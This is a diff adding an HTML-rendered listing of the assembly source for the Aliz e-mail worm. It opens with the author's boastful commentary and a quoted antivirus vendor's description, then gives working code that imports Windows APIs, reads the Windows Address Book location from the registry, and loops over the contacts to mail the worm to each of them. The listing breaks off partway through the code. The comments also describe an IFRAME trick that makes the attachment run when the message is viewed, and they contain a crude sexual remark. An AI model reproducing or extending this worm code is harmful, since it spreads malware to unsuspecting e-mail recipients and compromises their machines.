@@ -1,0 +1,1283 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Email-Worm.Win32.Aliz - alizee.asm.html</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	color: #FF8000;
+}
+.sc3 {
+	color: #808080;
+}
+.sc4 {
+	font-weight: bold;
+	color: #000080;
+}
+.sc5 {
+}
+.sc6 {
+	font-weight: bold;
+	color: #0000FF;
+}
+.sc8 {
+	font-weight: bold;
+	color: #8080FF;
+}
+.sc9 {
+	color: #0080FF;
+}
+.sc10 {
+	font-weight: bold;
+	color: #000080;
+}
+.sc12 {
+	color: #808000;
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment $</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; ey, this comment is added 21 november 2001. i saw that aliz is spreading</span><span class="sc0">
+</span><span class="sc1">; pretty, so just some more about-text then the original release (i thought it</span><span class="sc0">
+</span><span class="sc1">; would be a worm that nobody would ever know :).</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; well, i wrote this worm long ago, in about two days, just cause i was bored.</span><span class="sc0">
+</span><span class="sc1">; it was around the time that the iframe sploit was 1-day old, thats all i re-</span><span class="sc0">
+</span><span class="sc1">; member and i have no clue how long ago that was.</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; anyway, i wanted to code a small worm. i did it, but what then? i didn't wanna</span><span class="sc0">
+</span><span class="sc1">; drop it itw cause massmailers are lame. (the total worm is lame, really).</span><span class="sc0">
+</span><span class="sc1">; so i decided that it would be nice for coderz #2... that was going to be</span><span class="sc0">
+</span><span class="sc1">; released around that days (heheheheeheh a half year later now i write this</span><span class="sc0">
+</span><span class="sc1">; text and it still getting released soon). anyway, thats why that text is in</span><span class="sc0">
+</span><span class="sc1">; it. i had to fill much space, so thats why that huge stupid text.</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; anyway, coderz#2 wasn't getting released for weeks, months, etc, so i decided</span><span class="sc0">
+</span><span class="sc1">; to fork the AV's a sample, and i uploaded it to my site, as a binary, in a</span><span class="sc0">
+</span><span class="sc1">; zip file with a secret password, as a test sample.</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; nothing happens and i forgot the total fuck worm. although avx wrote a</span><span class="sc0">
+</span><span class="sc1">; description very fast because they are lame.</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; well, 19 november i was just checking f-secure.com, because they have nice</span><span class="sc0">
+</span><span class="sc1">; a special section pictures of viruses (payloads) in their description part,</span><span class="sc0">
+</span><span class="sc1">; and what did i see: aliz. in the wild...</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; woowwie ;)</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; now it is high risk blabla on many av sites...</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; well, its a lame worm, and i didn't care really cause nobody would really</span><span class="sc0">
+</span><span class="sc1">; see it (look over the source). anyway, now it differs a lil i guess ;)</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; heh.</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; greetings</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; mar00n (a lame nick too)</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; description, today i pick f-secure because its the most complimentous desc. ;)</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; btw, 'in pure Assembly', did they recognize it or was it because of my text</span><span class="sc0">
+</span><span class="sc1">; in the body?: '..power in pure win32asm..' hehe ;))</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; ------------------------------------------------------------------------------</span><span class="sc0">
+</span><span class="sc1">; Aliz is a very small e-mail worm written in pure Assembly. It appeared in the</span><span class="sc0">
+</span><span class="sc1">; wild on 18-20th of November 2001. The worm's file is only 4 kilobytes long</span><span class="sc0">
+</span><span class="sc1">; and its code is compressed. It can be considered one of the smallest Win32</span><span class="sc0">
+</span><span class="sc1">; worms ever created.</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; When the worm is run, it first unpacks itself and then passes control to API</span><span class="sc0">
+</span><span class="sc1">; address setup routine. When all needed API addresses are collected, the</span><span class="sc0">
+</span><span class="sc1">; control is passed to the main worm's code. The worm checks the Registry for</span><span class="sc0">
+</span><span class="sc1">; the location of Windows Address Book file and loads it into memory. The worm</span><span class="sc0">
+</span><span class="sc1">; then connects to default SMTP server (for SMTP server info the worm checks</span><span class="sc0">
+</span><span class="sc1">; Internet Accound Manager data in the Registry) and sends itself to all</span><span class="sc0">
+</span><span class="sc1">; recepients of Windows Address Book. The infected message looks like that:</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">;  Subject: &lt;randomly composed from 5 different parts, see below&gt;</span><span class="sc0">
+</span><span class="sc1">;  Body: &lt;empty multi-part MIME message with HTML formatting and i-frame trick&gt;</span><span class="sc0">
+</span><span class="sc1">;  Attachment: Whatever.exe</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; The subject of infected message is randomly composed from 5 different parts: </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">;  Fw:</span><span class="sc0">
+</span><span class="sc1">;  Fw: Re:</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">;  Cool</span><span class="sc0">
+</span><span class="sc1">;  Nice</span><span class="sc0">
+</span><span class="sc1">;  Hot</span><span class="sc0">
+</span><span class="sc1">;  some</span><span class="sc0">
+</span><span class="sc1">;  Funny</span><span class="sc0">
+</span><span class="sc1">;  weird</span><span class="sc0">
+</span><span class="sc1">;  funky</span><span class="sc0">
+</span><span class="sc1">;  great</span><span class="sc0">
+</span><span class="sc1">;  Interesting</span><span class="sc0">
+</span><span class="sc1">;  many</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">;  website</span><span class="sc0">
+</span><span class="sc1">;  site</span><span class="sc0">
+</span><span class="sc1">;  pics</span><span class="sc0">
+</span><span class="sc1">;  urls</span><span class="sc0">
+</span><span class="sc1">;  pictures</span><span class="sc0">
+</span><span class="sc1">;  stuff</span><span class="sc0">
+</span><span class="sc1">;  mp3s</span><span class="sc0">
+</span><span class="sc1">;  shit</span><span class="sc0">
+</span><span class="sc1">;  music</span><span class="sc0">
+</span><span class="sc1">;  info</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">;  to check</span><span class="sc0">
+</span><span class="sc1">;  for you</span><span class="sc0">
+</span><span class="sc1">;  i found</span><span class="sc0">
+</span><span class="sc1">;  to see</span><span class="sc0">
+</span><span class="sc1">;  here</span><span class="sc0">
+</span><span class="sc1">;  - check it</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">;  !!</span><span class="sc0">
+</span><span class="sc1">;  !</span><span class="sc0">
+</span><span class="sc1">;  :-)</span><span class="sc0">
+</span><span class="sc1">;  ?!</span><span class="sc0">
+</span><span class="sc1">;  hehe ;-)</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; For example a subject can be: "Fw: Cool pictures i found !!" or</span><span class="sc0">
+</span><span class="sc1">; "Nice website to check hehe ;-)".</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; The message contains a MIME-encoded attachment - the worm's file with</span><span class="sc0">
+</span><span class="sc1">; 'Whatever.exe' name. The body is an empty multi-part MIME message with HTML</span><span class="sc0">
+</span><span class="sc1">; formatting and i-frame trick that was previously found in Nimda and Klez</span><span class="sc0">
+</span><span class="sc1">; worms. Because of this trick on some systems the worm is able to self-launch</span><span class="sc0">
+</span><span class="sc1">; itself when an infected e-mail is viewed (for example, with Outlook and</span><span class="sc0">
+</span><span class="sc1">; IE 5.0 or 5.01). To do this the worm uses a known vulnerability in IE that</span><span class="sc0">
+</span><span class="sc1">; allows execution of an email attachment. This vulnerability is fixed and a</span><span class="sc0">
+</span><span class="sc1">; patch for it is available on Microsoft site:</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; http://www.microsoft.com/windows/ie/downloads/critical/q290108/default.asp </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; The worm doesn't install itself to system, it runs, sends itself out and</span><span class="sc0">
+</span><span class="sc1">; terminates its process.</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; The worm contains the following text strings that are never displayed: </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">;  :::iworm.alizee.by.mar00n!ikx2oo1:::</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">;  while typing this text i realize this text got added on many av</span><span class="sc0">
+</span><span class="sc1">;  description sites, because this silly worm could be easily a</span><span class="sc0">
+</span><span class="sc1">;  hype. i wonder which av claims '[companyname] stopped high risk</span><span class="sc0">
+</span><span class="sc1">;  worm before it could escape!' or shit like that. heh, or they</span><span class="sc0">
+</span><span class="sc1">;  boycot my virus because of this text. well, it is easy enough</span><span class="sc0">
+</span><span class="sc1">;  for the poor av's to add this worm; since it was only released</span><span class="sc0">
+</span><span class="sc1">;  as source in coderz#2... btw, loveletter*2 power in pure win32asm</span><span class="sc0">
+</span><span class="sc1">;  and only a 4k exe file. heh, vbs kiddies, phear win32asm. :)</span><span class="sc0">
+</span><span class="sc1">;  thx to: bumblebee!29a, asmodeus!ikx. greets to: starzer0!ikx,</span><span class="sc0">
+</span><span class="sc1">;  t-2000!ir, ultras!mtx &amp; sweet gigabyte...</span><span class="sc0">
+</span><span class="sc1">;  btw,burgemeester van sneek: ik zoek nog een baantje...</span><span class="sc0">
+</span><span class="sc1">;  (alignmentfillingtext)</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; F-Secure Anti-Virus detects Aliz worm with the latest updates. </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; [Analysis: Alexey Podrezov; F-Secure Corp.; November 19th, 2001] </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; ------------------------------------------------------------------------------</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; well and here the old comment</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; $</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; comment $</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; iworm alizee by mar00n ! ikx 2oo1</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; alizee is a worm that mails itself around to all addies in your addressbook.</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; not very special, is it?</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; well:</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">;        1-it shows that the stack is your best friend</span><span class="sc0">
+</span><span class="sc1">;        2-the generated exe file is only 4096 bytes</span><span class="sc0">
+</span><span class="sc1">;        3-it shows a clean compatible way in win32asm to obtain email addies</span><span class="sc0">
+</span><span class="sc1">;        4-the subject is random generated</span><span class="sc0">
+</span><span class="sc1">;        5-the attached exe file gets automatically executed if the reader</span><span class="sc0">
+</span><span class="sc1">;          tries to read the message</span><span class="sc0">
+</span><span class="sc1">;        6-the whole thing is very clean written (who cares)</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; indeed, very standard, except step 2 and 5 ;)</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; more about them:</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; step 2: yes, its very small, the code is compressed using aplib, and</span><span class="sc0">
+</span><span class="sc1">;         decompressed using my own tweaked optmized aplib decompressor</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; step 5: indeed, this means loveletter power*10. (code? search for &lt;html&gt; tag)</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; succesfully tested under win98 &amp; win2k... its nice to talk with your creation</span><span class="sc0">
+</span><span class="sc1">; using netcat ;)</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; 220 hi</span><span class="sc0">
+</span><span class="sc1">; helo localhost</span><span class="sc0">
+</span><span class="sc1">; 250 ey man ;) wassup? do you have mail to send?</span><span class="sc0">
+</span><span class="sc1">; mail from: some@one.com</span><span class="sc0">
+</span><span class="sc1">; 250 and to who?</span><span class="sc0">
+</span><span class="sc1">; rcpt to: sucker@microsoft.com</span><span class="sc0">
+</span><span class="sc1">; 250 seems ok to me</span><span class="sc0">
+</span><span class="sc1">; data</span><span class="sc0">
+</span><span class="sc1">; 354 go ahead ;) ... but don't forget the cr.cr, ok?</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; blablablla</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; well erh, this worm is very hard to compile, see my zip file for the bat files</span><span class="sc0">
+</span><span class="sc1">; and external programs you need.</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; thx:            bumblebee       for your base64 routines</span><span class="sc0">
+</span><span class="sc1">;                 asmodeus        for the first one doing this</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; grtz/fear:      starzer0,billy,lifewire,vecna,z0mbie,t2k,benny,ratter,griyo</span><span class="sc0">
+</span><span class="sc1">;                 and gig</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; ps, i don't love alizee or what. she's just ... highly fuckable?</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; $</span><span class="sc0">
+</span><span class="sc2">.386p</span><span class="sc0">
+</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
+</span><span class="sc5">locals</span><span class="sc0"> </span><span class="sc5">__</span><span class="sc0">
+
+</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc10">c</span><span class="sc4">:</span><span class="sc0">\</span><span class="sc5">tasm</span><span class="sc0">\</span><span class="sc6">inc</span><span class="sc0">\</span><span class="sc5">myinc.inc</span><span class="sc0">
+
+</span><span class="sc5">sizer</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4098</span><span class="sc0">
+
+</span><span class="sc5">binsize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">sizer</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">-(</span><span class="sc2">3</span><span class="sc4">-(</span><span class="sc5">sizer</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">))</span><span class="sc0">         </span><span class="sc1">;stupid 3-alignment for base64</span><span class="sc0">
+
+
+</span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">api</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">api</span><span class="sc4">]</span><span class="sc0">
+        </span><span class="sc9">endm</span><span class="sc0">
+
+</span><span class="sc5">maxspread</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">666</span><span class="sc0">                     </span><span class="sc1">;max mail to n addies</span><span class="sc0">
+
+</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc10">c</span><span class="sc4">:</span><span class="sc0">\</span><span class="sc5">tasm</span><span class="sc0">\</span><span class="sc6">inc</span><span class="sc0">\</span><span class="sc5">win32api.inc</span><span class="sc0">                </span><span class="sc1">;luv to jackyqwerty</span><span class="sc0">
+</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc10">c</span><span class="sc4">:</span><span class="sc0">\</span><span class="sc5">tasm</span><span class="sc0">\</span><span class="sc6">inc</span><span class="sc0">\</span><span class="sc5">useful.inc</span><span class="sc0">
+</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc10">c</span><span class="sc4">:</span><span class="sc0">\</span><span class="sc5">tasm</span><span class="sc0">\</span><span class="sc6">inc</span><span class="sc0">\</span><span class="sc5">winsock.inc</span><span class="sc0">
+
+</span><span class="sc1">;extrn   LoadLibraryA:proc;</span><span class="sc0">
+</span><span class="sc1">;extrn   GetProcAddress:proc;</span><span class="sc0">
+
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+</span><span class="sc5">_CODE</span><span class="sc0">           </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
+</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">nop</span><span class="sc0">                                     </span><span class="sc1">;heh</span><span class="sc0">
+
+</span><span class="sc5">_CODE</span><span class="sc0">           </span><span class="sc9">ends</span><span class="sc0">
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+
+</span><span class="sc9">.data</span><span class="sc0">                           </span><span class="sc1">;only to use virtual offset 402000</span><span class="sc0">
+</span><span class="sc1">;                int     3</span><span class="sc0">
+               
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">overseh</span><span class="sc0">
+
+                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">       </span><span class="sc1">;if seh we simply hang. why not? :)</span><span class="sc0">
+
+                </span><span class="sc5">overseh</span><span class="sc4">:</span><span class="sc0">
+                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
+
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+                </span><span class="sc1">;ebx=module base/handle</span><span class="sc0">
+                </span><span class="sc1">;esi=crc32s</span><span class="sc0">
+                </span><span class="sc1">;edi=wheretostore</span><span class="sc0">
+
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">apicrcs</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">apis</span><span class="sc0">
+
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__x</span><span class="sc0">
+                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"KERNEL32"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc5">__x</span><span class="sc4">:</span><span class="sc0">
+
+</span><span class="sc5">i_importall_loop</span><span class="sc4">:</span><span class="sc0">
+</span><span class="sc1">;                call    LoadLibraryA</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc2">2034h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;loadlibrary</span><span class="sc0">
+                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">i_importapis</span><span class="sc0">                    </span><span class="sc1">;first import k32</span><span class="sc0">
+                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+                </span><span class="sc6">lodsb</span><span class="sc0">
+                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
+                </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">i_importall_done</span><span class="sc0">                </span><span class="sc1">;modulenamelength</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
+                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
+                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">i_importall_loop</span><span class="sc0">
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+
+</span><span class="sc5">i_importall_done</span><span class="sc4">:</span><span class="sc0">
+
+                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">stackframe</span><span class="sc0">
+                
+                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">stack2</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
+
+</span><span class="sc1">;                int     3</span><span class="sc0">
+
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__y</span><span class="sc0">
+                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Software\Microsoft\WAB\WAB4\Wab File Name"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc5">__y</span><span class="sc4">:</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">readregkey</span><span class="sc0">
+
+                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ebp.buffer</span><span class="sc4">]</span><span class="sc0">
+
+                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">stack2</span><span class="sc0">
+                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">exit</span><span class="sc0">
+
+                </span><span class="sc1">;esp = filename of wab we choose</span><span class="sc0">
+
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
+
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">openfile</span><span class="sc0">
+                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit</span><span class="sc0">
+
+                </span><span class="sc1">;esi = wabmapview (nice name;)</span><span class="sc0">
+
+                </span><span class="sc1">;int     3</span><span class="sc0">
+
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">64h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;number of adds</span><span class="sc0">
+                </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">exit</span><span class="sc0">                            </span><span class="sc1">;victim has no friends</span><span class="sc0">
+                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">60h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;pointer addies</span><span class="sc0">
+
+</span><span class="sc1">;                dec     ecx</span><span class="sc0">
+
+</span><span class="sc1">;                cmp     ecx,maxspread</span><span class="sc0">
+</span><span class="sc1">;                jbe     mailaround</span><span class="sc0">
+</span><span class="sc1">;                push    maxspread</span><span class="sc0">
+</span><span class="sc1">;                pop     ecx</span><span class="sc0">
+
+                </span><span class="sc1">;parse wab file for addies &amp; mail the fun</span><span class="sc0">
+
+</span><span class="sc5">mailaround</span><span class="sc4">:</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
+
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
+                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">nounicode</span><span class="sc0">
+
+
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">;unicode support</span><span class="sc0">
+                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ebp.addie</span><span class="sc4">]</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
+
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">48h</span><span class="sc0">
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
+</span><span class="sc5">__y</span><span class="sc4">:</span><span class="sc0">
+                </span><span class="sc6">lodsw</span><span class="sc0">
+                </span><span class="sc6">stosb</span><span class="sc0">
+                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__y</span><span class="sc0">
+
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;ebp+addie</span><span class="sc0">
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">;esi in wab.addresses</span><span class="sc0">
+                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
+
+</span><span class="sc5">nounicode</span><span class="sc4">:</span><span class="sc0">
+</span><span class="sc1">;                int     3</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">share</span><span class="sc0">                           </span><span class="sc1">;share the fun</span><span class="sc0">
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
+
+                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
+
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
+                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">mailaround</span><span class="sc0">
+
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">ebp.createhandle</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;close wabfilehandle</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">ebp.maphandle</span><span class="sc4">]</span><span class="sc0">
